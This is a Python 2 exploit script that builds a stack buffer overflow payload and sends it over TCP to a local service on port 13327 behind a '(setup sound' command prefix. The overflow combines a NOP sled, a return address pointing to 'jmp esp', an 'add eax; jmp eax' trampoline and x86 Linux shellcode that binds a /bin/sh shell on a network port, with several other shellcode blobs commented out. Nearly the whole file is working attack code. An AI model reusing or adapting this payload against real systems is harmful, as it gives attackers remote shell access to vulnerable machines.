import socket, time, sys


try:
	length_ = 4379
	#crash= "A" * length_
	exact_offset=4368

	# Address with 'jmp esp' 0x08134597
	#eip_value="\x97\x45\x13\x08"
	eip_value="\x97\x45\x13\x08"
	# 'add eax, 12' -> 83c00c
	# 'jmp eax' -> ffe0
	#shellcode="\xd9\xc4\xbd\xfb\x76\x39\xbf\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x14\x31\x6b\x19\x83\xc3\x04\x03\x6b\x15\x19\x83\x08\x64\x2a\x8f\x38\xd9\x87\x3a\xbd\x54\xc6\x0b\xa7\xab\x88\x37\x76\x66\xe0\xc5\x86\x97\xac\xa3\x96\xc6\x1c\xbd\x76\x82\xfa\xe5\xb5\xd3\x8b\x57\x42\x67\x8f\xe7\x2c\x4a\x0f\x44\x01\x32\xc2\xcb\xf2\xe2\xb6\xf4\xac\xd9\xc6\x42\x34\x1a\xae\x7b\xe9\xa9\x46\xec\xda\x2f\xff\x82\xad\x53\xaf\x09\x27\x72\xff\xa5\xfa\xf5"
	#print len(shellcode)
	#payload="\x6a\x15\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x67\x38\x5a\x88\x83\xeb\xfc\xe2\xf4\x56\xe3\x09\xcb\x34\x52\x58\xe2\x01\x60\xc3\x01\x86\xf5\xda\x1e\x24\x6a\x3c\xe0\x76\x64\x3c\xdb\xee\xd9\x30\xee\x3f\x68\x0b\xde\xee\xd9\x97\x08\xd7\x5e\x8b\x6b\xaa\xb8\x08\xda\x31\x7b\xd3\x69\xd7\x5e\x97\x08\xf4\x52\x58\xd1\xd7\x07\x97\x08\x2e\x41\xa3\x38\x6c\x6a\x32\xa7\x48\x4b\x32\xe0\x48\x5a\x33\xe6\xee\xdb\x08\xdb\xee\xd9\x97\x08"
	#print len(payload)

	host = "127.0.0.1"
	offset = 4368
	crash = 4379

	# buf =  "\xd9\xee\xbe\xde\x28\xe2\xd9\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x1f\x83\xe8\xfc\x31\x70\x16\x03\x70\x16\xe2\x2b\x42\xe8\x87\xe2\x48\x1b\xd4\x57\x2c\xb7\x71\x55\x02\x51\x0f\xb8\xaf\x1e\x98\x61\x58\x60\xa7\x95\x99\xf6\xa5\x95\x98\xbd\x23\x74\xf0\xa7\x6b\x26\x54\x7f\x05\x27\x15\xb2\x95\x22\x5a\x35\x8f\x62\x2f\xfb\xc7\xd8\xcf\x03\x18\x44\xba\x03\x72\x71\xb3\xe7\xb3\xb0\x0e\x67\x36\x82\xe8\xd5\xd2\x25\xb9\x21\x9c\x29\xad\x2d\xde\xa0\x2e\xec\x35\xbe\x71\x0c\xc5\x0e\x0c\x1e\x56\xeb\x2f\xd8\x47\xa8\x26\xf8\xf1\xf8\x35\x4b\x02\xc9\xc6\x2e\xc5\xa9\xc4\xcf\x27\xf1\xc8\x2f\xa8\x01\x70\x2e\xa8\x01\x86\xfc\x28"
	buf = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

	'''
	print len(buf)
	crash="\90"*32
	crash+=buf
	crash+="\90"*(exact_offset-len(crash))
	crash+=eip_value
	crash+="\x83\xc0\x0c\xff\xe0"
	crash+="\x90"*(length_-len(crash))
	'''
	
	offset = 4368
	crash = 4379
	overflow = "\x90" * 32
	overflow += buf
	overflow += "\x90" * (offset - len(overflow))
	overflow += "\x97\x45\x13\x08" # jmp esp
	overflow += "\x83\xc0\x0c" # add 12 to eax
	overflow += "\xff\xe0" # jmp eax
	overflow += "\x90" * (crash - len(overflow))

	#crash=shellcode+"A"*(exact_offset-105)+eip_value+"\x83\xc0\x0c\xff\xe0\x90\x90"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('127.0.0.1',13327))
	data = s.recv(1024)
	#buffer = "\x11(setup sound " + crash + "\x90\x00#"
	buffer = "\x11(setup sound " + overflow + "\x90\x00#"
	s.send(buffer)
	time.sleep(6)
	s.close()
except ValueError as e:
	print e
